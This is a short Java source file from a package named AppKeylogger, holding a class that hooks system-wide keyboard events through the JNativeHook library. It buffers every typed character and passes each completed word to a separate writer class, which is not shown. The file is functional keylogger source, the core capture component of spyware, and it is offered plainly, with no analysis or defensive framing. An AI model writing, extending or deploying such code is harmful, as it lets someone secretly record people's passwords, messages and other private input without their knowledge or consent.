package AppKeylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class interceptar implements NativeKeyListener{
	 
	private StringBuilder str = new StringBuilder();
	
	 public void nativeKeyPressed(NativeKeyEvent arg0) {
		 
     }

     public void nativeKeyReleased(NativeKeyEvent arg0) {
     }

     public void nativeKeyTyped(NativeKeyEvent arg0) {
    	 if (Character.isWhitespace(arg0.getKeyChar())){
             capturar.escreverTexto(str.toString());
             str.delete(0, str.length());
    	 }else{
             str.append(arg0.getKeyChar());
      }
    	 
     }
}
